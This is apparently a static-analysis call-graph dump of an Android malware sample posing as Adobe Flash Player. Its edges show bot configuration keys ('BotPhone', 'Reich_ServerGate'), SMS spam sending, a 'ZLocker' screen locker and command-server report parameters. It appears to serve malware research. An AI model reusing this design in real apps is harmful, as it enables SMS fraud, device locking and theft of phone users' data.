VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: void startActivityForResult(android.content.Intent,int)>(r2, 1) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void startActivityForResult(android.content.Intent,int)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("macros[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<com.adobe.flashplayer_.MacrosStat$1: android.os.CountDownTimer start()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <android.os.CountDownTimer: android.os.CountDownTimer start()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAState", "B", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r8 = virtualinvoke r8.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r36 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.flashplayer.Certificate: void <init>()> ==> <android.app.Activity: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=calls&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r3 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, r19, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)>
SPECIAL edge: r34 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("spam_data", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke $r13.<java.lang.String: boolean contains(java.lang.CharSequence)>("nodata") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashARM: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void onDestroy()>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("setFilter") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotLocation", $r2) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
STATIC edge: $r42 = staticinvoke <java.lang.Long: java.lang.Long valueOf(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Long: java.lang.Long valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.packages.ZLocker: void <init>()> ==> <android.app.Activity: void <init>()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.flashplayer_.FlashARM: void <init>()> ==> <android.app.Activity: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", $r24, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("ru") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int length()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
STATIC edge: $r2 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r2) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashY: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: void <init>()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r28 = virtualinvoke $r26.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r27) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: android.content.ComponentName startService(android.content.Intent)>($r1) in <com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "spamlist.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.packages.ZLocker: void <init>()>() in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.StringBuffer: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <android.content.Intent: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.content.Intent: void <clinit>()>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("spam_data", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>(java.lang.String)>($r2) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r19) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r43 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[A-z]{4}[0-9]{4}") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.String: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.String: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("#", "W") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
CLINIT edge: staticinvoke <android.provider.ContactsContract$CommonDataKinds$Phone: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.provider.ContactsContract$CommonDataKinds$Phone: void <clinit>()>
